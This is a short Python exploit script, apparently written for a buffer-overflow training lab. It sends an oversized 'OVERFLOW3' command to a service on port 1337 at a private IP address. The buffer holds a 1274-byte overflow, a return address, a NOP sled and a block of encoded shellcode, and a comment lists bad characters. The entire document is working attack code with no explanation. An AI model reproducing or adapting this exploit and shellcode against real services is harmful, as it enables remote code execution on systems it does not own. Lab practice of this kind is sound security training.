import socket

ip = "10.10.39.99"
port = 1337

prefix = "OVERFLOW3 "
offset = 1274
overflow = "A" * offset
retn = "\x05\x12\x50\x62"
padding = "\x90" * 16
#\x00\x11\x40\x5f\xb8\xee
payload = (
    "\xfc\xbb\x37\xeb\xb0\x3f\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
    "\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xcb\x03\x32\x3f\x33"
    "\xd4\x53\xc9\xd6\xe5\x53\xad\x93\x56\x64\xa5\xf1\x5a\x0f\xeb"
    "\xe1\xe9\x7d\x24\x06\x59\xcb\x12\x29\x5a\x60\x66\x28\xd8\x7b"
    "\xbb\x8a\xe1\xb3\xce\xcb\x26\xa9\x23\x99\xff\xa5\x96\x0d\x8b"
    "\xf0\x2a\xa6\xc7\x15\x2b\x5b\x9f\x14\x1a\xca\xab\x4e\xbc\xed"
    "\x78\xfb\xf5\xf5\x9d\xc6\x4c\x8e\x56\xbc\x4e\x46\xa7\x3d\xfc"
    "\xa7\x07\xcc\xfc\xe0\xa0\x2f\x8b\x18\xd3\xd2\x8c\xdf\xa9\x08"
    "\x18\xfb\x0a\xda\xba\x27\xaa\x0f\x5c\xac\xa0\xe4\x2a\xea\xa4"
    "\xfb\xff\x81\xd1\x70\xfe\x45\x50\xc2\x25\x41\x38\x90\x44\xd0"
    "\xe4\x77\x78\x02\x47\x27\xdc\x49\x6a\x3c\x6d\x10\xe3\xf1\x5c"
    "\xaa\xf3\x9d\xd7\xd9\xc1\x02\x4c\x75\x6a\xca\x4a\x82\x8d\xe1"
    "\x2b\x1c\x70\x0a\x4c\x35\xb7\x5e\x1c\x2d\x1e\xdf\xf7\xad\x9f"
    "\x0a\x57\xfd\x0f\xe5\x18\xad\xef\x55\xf1\xa7\xff\x8a\xe1\xc8"
    "\xd5\xa2\x88\x33\xbe\xc6\x4a\x1d\x98\xbf\x50\x61\xf5\x63\xdc"
    "\x87\x9f\x8b\x88\x10\x08\x35\x91\xea\xa9\xba\x0f\x97\xea\x31"
    "\xbc\x68\xa4\xb1\xc9\x7a\x51\x32\x84\x20\xf4\x4d\x32\x4c\x9a"
    "\xdc\xd9\x8c\xd5\xfc\x75\xdb\xb2\x33\x8c\x89\x2e\x6d\x26\xaf"
    "\xb2\xeb\x01\x6b\x69\xc8\x8c\x72\xfc\x74\xab\x64\x38\x74\xf7"
    "\xd0\x94\x23\xa1\x8e\x52\x9a\x03\x78\x0d\x71\xca\xec\xc8\xb9"
    "\xcd\x6a\xd5\x97\xbb\x92\x64\x4e\xfa\xad\x49\x06\x0a\xd6\xb7"
    "\xb6\xf5\x0d\x7c\xd6\x17\x87\x89\x7f\x8e\x42\x30\xe2\x31\xb9"
    "\x77\x1b\xb2\x4b\x08\xd8\xaa\x3e\x0d\xa4\x6c\xd3\x7f\xb5\x18"
    "\xd3\x2c\xb6\x08\xd3\xd2\x48\xb3"
)
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
